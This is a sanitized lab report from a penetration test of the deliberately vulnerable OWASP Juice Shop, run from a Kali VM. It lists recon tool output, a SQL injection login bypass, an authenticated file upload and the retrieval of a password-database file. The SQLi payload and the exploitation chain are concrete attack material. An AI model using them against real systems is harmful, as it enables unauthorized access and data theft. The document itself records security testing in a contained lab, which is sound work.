> Public sanitized edition: sensitive personal, target, path, IP, alias, advisory, and run-specific evidence fields are redacted. This repository does not authorize live testing.

# Kali Verified Exploit-Flow Wave 2

Status: completed Kali-side aggressive-lab rerun / verified-flow supplement
Date: 2026-05-22 08:22 local
Route/tool: Windows Hermes control plane -> direct SSH/SCP / project Kali bridge -> `<attacker-vm>` (`<lab-ip>`) -> Juice Shop victim `http://<lab-ip>:3000/`
Artifacts:

- `<artifact-output-dir>/kali_verified_flow_wave2_20260522T001525Z/`
- `<artifact-output-dir>/kali_verified_flow_wave2b_20260522T001740Z/`

## Why this wave exists

The previous verified-flow wave accidentally ran target-touching checks from the Windows Git-Bash host instead of Kali. The operator correctly pointed out that target contact should default to `<attacker-vm>`. This wave corrected the route and reran the blocked tool work from Kali.

## Kali route confirmation

Observed from Kali:

```text
ROUTE=kali
USER=kali
eth0 <lab-ip>/24
```

Tools available on Kali:

```text
curl
python3
nmap
nikto
ffuf
sqlmap
nuclei
jq
whatweb
node
npm
chromium
firefox-esr
```

Target pre/post health:

```text
pre-health:  HTTP 200
post-health: HTTP 200
```

## Tool reruns

### nmap

Artifact:

`<artifact-output-dir>/kali_verified_flow_wave2_20260522T001525Z/tools/nmap_3000.txt`

Result:

```text
3000/tcp open
HTTP response fingerprint includes Juice Shop HTML and headers
```

Interpretation:

- Confirms host-only service exposure on port 3000.
- Not itself an exploit-flow finding.

### ffuf

Artifact:

`<artifact-output-dir>/kali_verified_flow_wave2_20260522T001525Z/tools/ffuf_bounded.json`

Meaningful hits included:

```text
/api-docs -> 301
/api-docs/swagger-ui-init.js -> 200
/metrics -> 200
/ftp -> 200
/ftp/legal.md -> 200
/ftp/acquisitions.md -> 200
/api/Users -> 401 control
/rest/admin/application-configuration -> 200
/rest/user/login -> 500 on GET/control
/administration -> SPA/root fallback candidate only
/file-upload -> SPA/root fallback on GET
/rest/products/search -> 200 endpoint
/rest/basket/1/coupon -> 401 control
/package.json -> SPA/root fallback
/server-status -> SPA/root fallback
```

Interpretation:

- Confirms previously promoted API docs, metrics, directory listing/file read, and unauth admin config leads from Kali.
- Also confirms many 200s are SPA/root fallback controls.

### nikto

Artifact:

`<artifact-output-dir>/kali_verified_flow_wave2_20260522T001525Z/tools/nikto.txt.txt`

Reported:

```text
Access-Control-Allow-Origin: *
X-Recruiting: /#/jobs
robots.txt present
missing HSTS
missing CSP
missing Permissions-Policy
missing Referrer-Policy
```

Interpretation:

- Hardening / metadata signals only.
- No verified exploit-flow success from Nikto alone.

### sqlmap

Artifact:

`<artifact-output-dir>/kali_verified_flow_wave2b_20260522T001740Z/sqlmap/sqlmap_login_bounded.txt`

Result:

- The bounded sqlmap run parsed the request but did not produce a useful confirmation in this invocation.
- Manual SQLi verification from Kali succeeded and remains the authoritative evidence.

## Verified-flow additions from Kali

### SQLi auth bypass reconfirmed from Kali

Observation file:

`<artifact-output-dir>/kali_verified_flow_wave2b_20260522T001740Z/observations.jsonl`

Evidence:

```text
/api/Users unauth -> 401
POST /rest/user/login with admin@juice-sh.op'-- -> 200
token_present=true
email=admin@juice-sh.op
/api/Users with token -> 200
user_count=22
```

This strengthens the existing bundle:

`modules/bundles/verified_lab_flow_sqli_auth_bypass_admin_users_read.md`

### File upload marker accepted after SQLi auth bypass

New bundle:

`modules/bundles/verified_lab_flow_file_upload_marker_pdf.md`

Evidence:

```text
POST /file-upload with redacted admin lab token and marker PDF -> HTTP 204
```

Artifact marker:

`<artifact-output-dir>/kali_verified_flow_wave2b_20260522T001740Z/state_change/vf2b_marker.pdf`

Interpretation:

- Verified lab state-changing upload endpoint acceptance.
- Not yet proof of retrievable arbitrary file write, path traversal, or RCE.

### Sensitive file read expanded

Additional file read evidence:

```text
/ftp/incident-support.kdbx -> HTTP 200 application/octet-stream, 3246 bytes
```

This is stronger than the prior text-file-only read, but the artifact is treated as sensitive-looking lab data and not promoted into report language beyond controlled lab evidence.

## Attempted but not verified

### Authenticated coupon/business logic

```text
POST /rest/basket/1/coupon with admin token -> HTTP 500 Unexpected path
```

Reason not verified:

- Wrong endpoint/method/body for current app route or missing basket workflow setup.
- Needs API docs/browser workflow or endpoint discovery before claiming business logic abuse.

### Browser-backed XSS

Artifacts:

`<artifact-output-dir>/kali_verified_flow_wave2b_20260522T001740Z/browser/`

Result:

- Chromium headless ran DOM/screenshot attempts for two XSS payloads.
- Marker files did not show runtime execution proof.

Reason not verified:

- No alert/callback/DOM mutation proof was captured.
- Needs a stronger browser instrumentation path or known Juice Shop XSS challenge flow.

### sqlmap automation

Reason not verified:

- The bounded sqlmap invocation did not produce useful confirmation, likely due request parsing/parameter selection constraints.
- Manual HTTP SQLi proof remains verified.

## Recovery

- No service crash observed.
- Post-health remained HTTP 200.
- No snapshot restore needed.

## Correction recorded

Default target-touching route for this project should be:

```text
Windows Hermes control plane -> Kali bridge / <attacker-vm> -> victim lab
```

Windows direct HTTP should be reserved for quick orchestration checks or emergency fallback, not the default for aggressive lab/tool work.
